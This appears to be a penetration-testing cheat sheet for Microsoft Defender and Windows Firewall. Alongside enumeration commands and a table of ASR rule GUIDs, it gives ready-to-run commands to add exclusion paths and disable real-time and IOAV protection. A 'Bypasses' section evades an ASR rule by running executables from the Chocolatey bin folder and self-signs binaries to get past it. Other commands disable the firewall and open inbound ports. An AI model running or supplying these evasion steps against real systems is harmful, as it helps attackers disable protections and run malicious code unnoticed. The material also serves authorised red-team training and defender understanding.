## Microsoft Defender & Firewall
- [Microsoft Defender](#microsoft-defender)
	- [Exclusions](#exclusions)
	- [Attack Surface Reduction (ASR) rules](#attack-surface-reduction-asr-rules)
- [Windows Firewall](#windows-firewall)

## Microsoft Defender

#### Check if windows defender is running
```
Get-MpComputerStatus
Get-MpComputerStatus | Select RealTimeProtectionEnabled
```

#### Get info about Windows Defender
```
Get-MpPreference
```

### Exclusions
#### Find excluded folders
```
Get-MpPreference | select Exclusion*
(Get-MpPreference).Exclusionpath
```

#### Enumerate through logs
- https://github.com/0xsp-SRD/MDE_Enum

```
MDE_Enum /local /paths

MDE_Enum /local /paths /access (check if current user has write access) 
```

#### Script to dump MDE config / ASR rules
- https://github.com/BlackSnufkin/Invoke-DumpMDEConfig?tab=readme-ov-file

#### Create exclusion
```
Set-MpPreference -ExclusionPath "<path>"
```

#### Check AV Detections
```
Get-MpThreatDetection | Sort-Object -Property InitialDetectionTime 
```

#### Get last AV Detection
```
Get-MpThreatDetection | Sort-Object -Property InitialDetectionTime | Select-Object -First 1
```

#### Disable AV monitoring
```
Set-MpPreference -DisableRealtimeMonitoring $true
Set-MpPReference -DisableIOAVProtection $true

powershell.exe -c 'Set-MpPreference -DisableRealtimeMonitoring $true; Set-MpPReference -DisableIOAVProtection $true'
```

### Attack Surface Reduction (ASR) rules
- Feature integrated with Microsoft Defender for Endpoint and Antivirus.
- They prevent actions and behaviors commonly used by malware and attackers by reducing the attack surface of devices.
- https://learn.microsoft.com/en-us/defender-endpoint/attack-surface-reduction-rules-reference

| Rule Name                                                                                         | Rule GUID                            |
| ------------------------------------------------------------------------------------------------- | ------------------------------------ |
| Block abuse of exploited vulnerable signed drivers                                                | 56a863a9-875e-4185-98a7-b882c64b5ce5 |
| Block Adobe Reader from creating child processes                                                  | 7674ba52-37eb-4a4f-a9a1-f0f9a1619a2c |
| Block all Office applications from creating child processes                                       | d4f940ab-401b-4efc-aadc-ad5f3c50688a |
| Block credential stealing from the Windows local security authority subsystem (lsass.exe)         | 9e6c4e1f-7d60-472f-ba1a-a39ef669e4b2 |
| Block executable content from email client and webmail                                            | be9ba2d9-53ea-4cdc-84e5-9b1eeee46550 |
| Block executable files from running unless they meet a prevalence, age, or trusted list criterion | 01443614-cd74-433a-b99e-2ecdc07bfc25 |
| Block execution of potentially obfuscated scripts                                                 | 5beb7efe-fd9a-4556-801d-275e5ffc04cc |
| Block JavaScript or VBScript from launching downloaded executable content                         | d3e037e1-3eb8-44c8-a917-57927947596d |
| Block Office applications from creating executable content                                        | 3b576869-a4ec-4529-8536-b80a7769e899 |
| Block Office applications from injecting code into other processes                                | 75668c1f-73b5-4cf0-bb93-3ecf5cb7cc84 |
| Block Office communication application from creating child processes                              | 26190899-1602-49e8-8b27-eb1d0a1ce869 |
| Block persistence through WMI event subscription  <br>* File and folder exclusions not supported. | e6db77e5-3df2-4cf1-b95a-636979351e5b |
| Block process creations originating from PSExec and WMI commands                                  | d1e49aac-8f56-4280-b9ba-993a6d77406c |
| Block rebooting machine in Safe Mode                                                              | 33ddedf1-c6e0-47cb-833e-de6133960387 |
| Block untrusted and unsigned processes that run from USB                                          | b2b3f03d-6a65-4f7b-a9c7-1c7ef74a9ba4 |
| Block use of copied or impersonated system tools                                                  | c0033c00-d16d-4114-a5a0-dc9b3a7d2ceb |
| Block Webshell creation for Servers                                                               | a8f5898e-1dc8-49a9-9878-85004b8a61e6 |
| Block Win32 API calls from Office macros                                                          | 92e97fa1-2edf-4476-bdd6-9dd0b4dddc7b |
| Use advanced protection against ransomware                                                        | c1db55ab-c21a-4637-bb3f-a12568109d35 |
- https://learn.microsoft.com/en-us/defender-endpoint/attack-surface-reduction-rules-reference#asr-rule-to-guid-matrix

#### Enumerate ASR rules
- https://github.com/directorcia/Office365/blob/master/win10-asr-get.ps1
```
. ./win10-asr-get.ps1
```

### ASR Reversing
- Virus Definition Module (VDM) is a file format used by Microsoft Defender to store databases of antivirus signatures.
- Stored within `C:\ProgramData\Microsoft\Windows Defender\Definition Updates\<GUID>`
	- `mpasbase.vdm` and `mpavbase.vm` contain the threat signatures, rules etc
	- Within these files Microsoft Defender stores the ASR rules as precompiled LUA scripts.

#### Reversing
1. Decompress `.vdm` files with python script https://gist.github.com/HackingLZ/65f289b8b0b9c8c3a675aa26c06dfe09
2. Decompile the pre-compiled extracted LUA files with https://github.com/viruscamp/luadec
3. Search in the decompiled LUA files in indication of ASR rules such as rule name, GUID, intune name

```
python3 vdm_lua_extract.py --decompile mpasbase.vdm LUA_mpasbase
```

### Bypasses
#### Block executable files from running unless they meet a prevalence, age, or trusted list criterion
- This ASR rule is bypassable because all executables within `C:\programdata\chocolatey\bin\*.exe` are excluded (Fixed, its still there but doesn't work on latest W11)

```lua
if (mp.IsPathExcludedForHipsRule)(l_0_2, "01443614-cd74-433a-b99e-2ecdc07bfc25") then
      return mp.CLEAN
    end
..snip...
    if (string.find)(l_0_2, "^.:\\programdata\\chocolatey\\bin\\[^%.\\]+%.exe$") ~= nil then
      return mp.CLEAN
    end
```

```
mkdir "C:\ProgramData\chocolatey\bin"
copy /Y "<PATH TO EXE>" "C:\ProgramData\chocolatey\bin\"
C:\ProgramData\chocolatey\bin\<EXE>
```

#### Block executable files from running unless they meet a prevalence, age, or trusted list criterion
- I had success with signing the executable

```
openssl req -x509 -newkey rsa:4096 -keyout key.pem -out cert.pem -sha256 -days 365
openssl pkcs12 -inkey key.pem -in cert.pem -export -out sign.pfx
signtool sign /f <PFX FILE> /p <PFX PASSWORD> /t http://timestamp.digicert.com /fd sha256 binary.exe
```

## Windows Firewall
#### Get state
```
Get-NetFirewallProfile -PolicyStore ActiveStore
```

#### Get rules
```
Get-netfirewallrule | format-table name,displaygroup,action,direction,enabled -autosize
```

#### Disable Firewall
```
Set-NetFirewallProfile -Profile Domain,Public,Private -Enabled False 
```

#### Enable firewall
```
Set-NetFirewallProfile -Profile Domain,Public,Private -Enabled True
```

#### Change default policy
```
Set-NetFirewallProfile -DefaultInboundAction Block -DefaultOutboundAction Allow 
```

#### Open port on firewall
```
netsh advfirewall firewall add rule name="Allow port" dir=in action=allow protocol=TCP localport=<PORT>

New-NetFirewallRule -DisplayName "Allow port" -Profile Domain -Direction Inbound -Action Allow -Protocol TCP -LocalPort <PORT>
```

#### Remove firewall rule
```
Remove-NetFirewallRule -DisplayName "Allow port"
```